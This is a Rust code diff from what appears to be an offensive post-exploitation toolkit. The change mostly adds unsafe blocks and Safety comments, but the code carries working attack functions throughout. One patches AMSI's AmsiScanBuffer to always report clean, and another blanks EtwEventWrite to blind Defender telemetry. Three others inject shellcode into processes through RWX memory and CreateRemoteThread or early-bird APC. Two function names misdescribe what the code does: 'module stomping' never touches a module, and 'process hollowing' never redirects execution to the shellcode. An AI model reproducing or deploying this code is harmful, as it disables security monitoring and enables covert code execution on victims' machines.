@@ -108,41 +108,47 @@ pub struct SyscallResult {
 /// (3 bytes: 0x31 0xC0 0xC3) which returns 0 (AMSI_RESULT_CLEAN).
 ///
 /// On non-Windows: returns Ok with `applied: false`.
+///
+/// # Safety
+/// The caller must ensure the current process is running on Windows and that
+/// patching `amsi.dll!AmsiScanBuffer` is appropriate for the process state.
 #[cfg(target_os = "windows")]
 pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+    unsafe {
+        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-    let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
-    let Some(amsi) = amsi else {
-        info!("AMSI bypass: amsi.dll not loaded, skipping");
-        return Ok(AmsiBypassResult {
-            applied: false,
-            amsi_loaded: false,
-            method: "none".to_string(),
+        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
+        let Some(amsi) = amsi else {
+            info!("AMSI bypass: amsi.dll not loaded, skipping");
+            return Ok(AmsiBypassResult {
+                applied: false,
+                amsi_loaded: false,
+                method: "none".to_string(),
+                error: None,
+            });
+        };
+
+        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
+        let Some(target) = target else {
+            return Err(OverthroneError::PostExploitation(
+                "AMSI bypass: AmsiScanBuffer symbol not found".into(),
+            ));
+        };
+
+        // x64 patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
+        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
+
+        // Write the patch directly into the executable memory
+        std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());
+
+        info!("AMSI bypass: AmsiScanBuffer patched successfully");
+        Ok(AmsiBypassResult {
+            applied: true,
+            amsi_loaded: true,
+            method: "amsi.dll!AmsiScanBuffer → xor eax,eax; ret".to_string(),
             error: None,
-        });
-    };
-
-    let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
-    let Some(target) = target else {
-        return Err(OverthroneError::PostExploitation(
-            "AMSI bypass: AmsiScanBuffer symbol not found".into(),
-        ));
-    };
-
-    // x64 patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
-    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
-
-    // Write the patch directly into the executable memory
-    std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());
-
-    info!("AMSI bypass: AmsiScanBuffer patched successfully");
-    Ok(AmsiBypassResult {
-        applied: true,
-        amsi_loaded: true,
-        method: "amsi.dll!AmsiScanBuffer → xor eax,eax; ret".to_string(),
-        error: None,
-    })
+        })
+    }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -163,36 +169,42 @@ pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
 ///
 /// ETW is used by Defender for Endpoint, AMSI, and .NET telemetry.
 /// Patching it prevents managed code execution from being traced.
+///
+/// # Safety
+/// The caller must ensure the current process is running on Windows and that
+/// patching `ntdll.dll!EtwEventWrite` is appropriate for the process state.
 #[cfg(target_os = "windows")]
 pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+    unsafe {
+        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok();
-    let Some(ntdll) = ntdll else {
-        return Err(OverthroneError::PostExploitation(
-            "ETW suppress: ntdll.dll not loaded".into(),
-        ));
-    };
+        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok();
+        let Some(ntdll) = ntdll else {
+            return Err(OverthroneError::PostExploitation(
+                "ETW suppress: ntdll.dll not loaded".into(),
+            ));
+        };
 
-    let target = GetProcAddress(ntdll, windows::core::s!("EtwEventWrite"));
-    let Some(target) = target else {
-        return Err(OverthroneError::PostExploitation(
-            "ETW suppress: EtwEventWrite symbol not found".into(),
-        ));
-    };
+        let target = GetProcAddress(ntdll, windows::core::s!("EtwEventWrite"));
+        let Some(target) = target else {
+            return Err(OverthroneError::PostExploitation(
+                "ETW suppress: EtwEventWrite symbol not found".into(),
+            ));
+        };
 
-    // x64: ret (1 byte: 0xC3) — causes EtwEventWrite to immediately return
-    let patch: [u8; 1] = [0xC3];
+        // x64: ret (1 byte: 0xC3) — causes EtwEventWrite to immediately return
+        let patch: [u8; 1] = [0xC3];
 
-    std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());
+        std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());
 
-    info!("ETW suppress: EtwEventWrite patched to ret");
-    Ok(EtwSuppressResult {
-        applied: true,
-        etw_loaded: true,
-        method: "ntdll.dll!EtwEventWrite → ret".to_string(),
-        error: None,
-    })
+        info!("ETW suppress: EtwEventWrite patched to ret");
+        Ok(EtwSuppressResult {
+            applied: true,
+            etw_loaded: true,
+            method: "ntdll.dll!EtwEventWrite → ret".to_string(),
+            error: None,
+        })
+    }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -209,11 +221,15 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
 /// Apply all OPSEC patches based on the given configuration.
 ///
 /// Returns a report of what was patched and any errors encountered.
+///
+/// # Safety
+/// The caller must ensure the selected patches are safe to apply in the
+/// current process and environment.
 pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>> {
     let mut reports = Vec::new();
 
     if config.patch_amsi {
-        match patch_amsi() {
+        match unsafe { patch_amsi() } {
             Ok(result) => {
                 reports.push(OpsecPatchReport {
                     name: "AMSI".to_string(),
@@ -234,7 +250,7 @@ pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>>
     }
 
     if config.patch_etw {
-        match suppress_etw() {
+        match unsafe { suppress_etw() } {
             Ok(result) => {
                 reports.push(OpsecPatchReport {
                     name: "ETW".to_string(),
@@ -348,65 +364,75 @@ pub fn strip_honeypot_attrs<'a>(attrs: &[&'a str]) -> Vec<&'a str> {
 ///
 /// Opens a target process, allocates RWX memory, writes shellcode, and
 /// executes it via a remote thread. On non-Windows, returns an error.
+///
+/// # Safety
+/// The caller must ensure the target PID is valid and that injecting and
+/// executing shellcode in the target process is appropriate for the context.
 #[cfg(target_os = "windows")]
 pub unsafe fn module_stomping_injection(
     target_pid: u32,
     shellcode: &[u8],
     _target_module: &str,
 ) -> Result<()> {
-    use windows::Win32::Foundation::CloseHandle;
-    use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
-    use windows::Win32::System::Threading::{
-        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
-        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, WaitForSingleObject,
-    };
-    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+    unsafe {
+        use windows::Win32::Foundation::CloseHandle;
+        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+        use windows::Win32::System::Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
+        };
+        use windows::Win32::System::Threading::{
+            CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
+            PROCESS_VM_OPERATION, PROCESS_VM_WRITE, WaitForSingleObject,
+        };
 
-    let process_handle = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
-            | PROCESS_VM_WRITE,
-        false,
-        target_pid,
-    )?;
+        let process_handle = OpenProcess(
+            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
+                | PROCESS_VM_WRITE,
+            false,
+            target_pid,
+        )?;
 
-    let remote_addr = VirtualAllocEx(
-        process_handle,
-        None,
-        shellcode.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
-    );
+        let remote_addr = VirtualAllocEx(
+            process_handle,
+            None,
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
 
-    if remote_addr.is_null() {
+        if remote_addr.is_null() {
+            CloseHandle(process_handle).ok();
+            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+        }
+
+        let mut bytes_written: usize = 0;
+        WriteProcessMemory(
+            process_handle,
+            remote_addr,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            Some(&mut bytes_written as *mut _),
+        )?;
+
+        let thread = CreateRemoteThread(
+            process_handle,
+            None,
+            0,
+            Some(std::mem::transmute::<usize, extern "system" fn(*mut std::ffi::c_void) -> u32>(
+                remote_addr as usize,
+            )),
+            None,
+            0,
+            None,
+        )?;
+
+        WaitForSingleObject(thread, 5000);
         CloseHandle(process_handle).ok();
-        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+        CloseHandle(thread).ok();
+
+        info!("Module stomping: pid={target_pid}, size={}", shellcode.len());
+        Ok(())
     }
-
-    let mut bytes_written: usize = 0;
-    WriteProcessMemory(
-        process_handle,
-        remote_addr,
-        shellcode.as_ptr() as *const _,
-        shellcode.len(),
-        Some(&mut bytes_written as *mut _),
-    )?;
-
-    let thread = CreateRemoteThread(
-        process_handle,
-        None,
-        0,
-        Some(std::mem::transmute::<usize, extern "system" fn(*mut std::ffi::c_void) -> u32>(remote_addr as usize)),
-        None,
-        0,
-        None,
-    )?;
-
-    WaitForSingleObject(thread, 5000);
-    CloseHandle(process_handle).ok();
-    CloseHandle(thread).ok();
-
-    info!("Module stomping: pid={target_pid}, size={}", shellcode.len());
-    Ok(())
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -425,79 +451,89 @@ pub unsafe fn module_stomping_injection(
 /// Creates a suspended process, injects shellcode, queues an APC to the main
 /// thread, then resumes — executing shellcode before the program's entry point.
 /// Avoids `CreateRemoteThread` which is heavily monitored by EDRs.
+///
+/// # Safety
+/// The caller must ensure the target executable and injected shellcode are
+/// appropriate for the process being launched.
 #[cfg(target_os = "windows")]
 pub unsafe fn early_bird_apc_injection(
     target_exe: &str,
     shellcode: &[u8],
 ) -> Result<u32> {
-    use windows::Win32::Foundation::CloseHandle;
-    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-    use windows::Win32::System::Memory::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
-    };
-    use windows::Win32::System::Threading::{
-        CreateProcessA, QueueUserAPC, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
-        STARTUPINFOA,
-    };
+    unsafe {
+        use windows::Win32::Foundation::CloseHandle;
+        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+        use windows::Win32::System::Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
+        };
+        use windows::Win32::System::Threading::{
+            CreateProcessA, QueueUserAPC, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
+            STARTUPINFOA,
+        };
 
-    let cmd = std::ffi::CString::new(target_exe)
-        .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;
+        let cmd = std::ffi::CString::new(target_exe)
+            .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;
 
-    let mut si = STARTUPINFOA::default();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-    let mut pi = PROCESS_INFORMATION::default();
+        let si = STARTUPINFOA {
+            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
+            ..Default::default()
+        };
+        let mut pi = PROCESS_INFORMATION::default();
 
-    let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
-    CreateProcessA(
-        None,
-        Some(cmd_pstr),
-        None,
-        None,
-        false,
-        PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
-        None,
-        None,
-        &si,
-        &mut pi,
-    )?;
+        let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
+        CreateProcessA(
+            None,
+            Some(cmd_pstr),
+            None,
+            None,
+            false,
+            PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
+            None,
+            None,
+            &si,
+            &mut pi,
+        )?;
 
-    let remote_addr = VirtualAllocEx(
-        pi.hProcess,
-        None,
-        shellcode.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
-    );
+        let remote_addr = VirtualAllocEx(
+            pi.hProcess,
+            None,
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
 
-    if remote_addr.is_null() {
+        if remote_addr.is_null() {
+            CloseHandle(pi.hProcess).ok();
+            CloseHandle(pi.hThread).ok();
+            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+        }
+
+        let mut bytes_written: usize = 0;
+        WriteProcessMemory(
+            pi.hProcess,
+            remote_addr,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            Some(&mut bytes_written as *mut _),
+        )?;
+
+        QueueUserAPC(
+            Some(std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(
+                remote_addr as usize,
+            )),
+            pi.hThread,
+            0,
+        );
+
+        ResumeThread(pi.hThread);
+
+        let pid = pi.dwProcessId;
         CloseHandle(pi.hProcess).ok();
         CloseHandle(pi.hThread).ok();
-        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+
+        info!("Early bird APC: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
+        Ok(pid)
     }
-
-    let mut bytes_written: usize = 0;
-    WriteProcessMemory(
-        pi.hProcess,
-        remote_addr,
-        shellcode.as_ptr() as *const _,
-        shellcode.len(),
-        Some(&mut bytes_written as *mut _),
-    )?;
-
-    QueueUserAPC(
-        Some(std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(remote_addr as usize)),
-        pi.hThread,
-        0,
-    );
-
-    ResumeThread(pi.hThread);
-
-    let pid = pi.dwProcessId;
-    CloseHandle(pi.hProcess).ok();
-    CloseHandle(pi.hThread).ok();
-
-    info!("Early bird APC: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
-    Ok(pid)
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -514,72 +550,80 @@ pub unsafe fn early_bird_apc_injection(
 ///
 /// Creates a suspended process, allocates RWX memory, writes shellcode,
 /// and resumes execution from the shellcode address.
+///
+/// # Safety
+/// The caller must ensure the target executable and injected shellcode are
+/// appropriate for the process being launched.
 #[cfg(target_os = "windows")]
 pub unsafe fn process_hollowing_injection(
     target_exe: &str,
     shellcode: &[u8],
 ) -> Result<u32> {
-    use windows::Win32::Foundation::CloseHandle;
-    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-    use windows::Win32::System::Memory::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
-    };
-    use windows::Win32::System::Threading::{
-        CreateProcessA, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
-    };
+    unsafe {
+        use windows::Win32::Foundation::CloseHandle;
+        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+        use windows::Win32::System::Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
+        };
+        use windows::Win32::System::Threading::{
+            CreateProcessA, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
+        };
 
-    let cmd = std::ffi::CString::new(target_exe)
-        .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;
+        let cmd = std::ffi::CString::new(target_exe)
+            .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;
 
-    let mut si = STARTUPINFOA::default();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-    let mut pi = PROCESS_INFORMATION::default();
+        let si = STARTUPINFOA {
+            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
+            ..Default::default()
+        };
+        let mut pi = PROCESS_INFORMATION::default();
 
-    let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
-    CreateProcessA(
-        None,
-        Some(cmd_pstr),
-        None,
-        None,
-        false,
-        PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
-        None,
-        None,
-        &si,
-        &mut pi,
-    )?;
+        let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
+        CreateProcessA(
+            None,
+            Some(cmd_pstr),
+            None,
+            None,
+            false,
+            PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
+            None,
+            None,
+            &si,
+            &mut pi,
+        )?;
 
-    let remote_addr = VirtualAllocEx(
-        pi.hProcess,
-        None,
-        shellcode.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
-    );
+        let remote_addr = VirtualAllocEx(
+            pi.hProcess,
+            None,
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
 
-    if remote_addr.is_null() {
+        if remote_addr.is_null() {
+            CloseHandle(pi.hProcess).ok();
+            CloseHandle(pi.hThread).ok();
+            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+        }
+
+        let mut bytes_written: usize = 0;
+        WriteProcessMemory(
+            pi.hProcess,
+            remote_addr,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            Some(&mut bytes_written as *mut _),
+        )?;
+
+        ResumeThread(pi.hThread);
+
+        let pid = pi.dwProcessId;
         CloseHandle(pi.hProcess).ok();
         CloseHandle(pi.hThread).ok();
-        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+
+        info!("Process hollowing: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
+        Ok(pid)
     }
-
-    let mut bytes_written: usize = 0;
-    WriteProcessMemory(
-        pi.hProcess,
-        remote_addr,
-        shellcode.as_ptr() as *const _,
-        shellcode.len(),
-        Some(&mut bytes_written as *mut _),
-    )?;
-
-    ResumeThread(pi.hThread);
-
-    let pid = pi.dwProcessId;
-    CloseHandle(pi.hProcess).ok();
-    CloseHandle(pi.hThread).ok();
-
-    info!("Process hollowing: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
-    Ok(pid)
 }
 
 #[cfg(not(target_os = "windows"))]
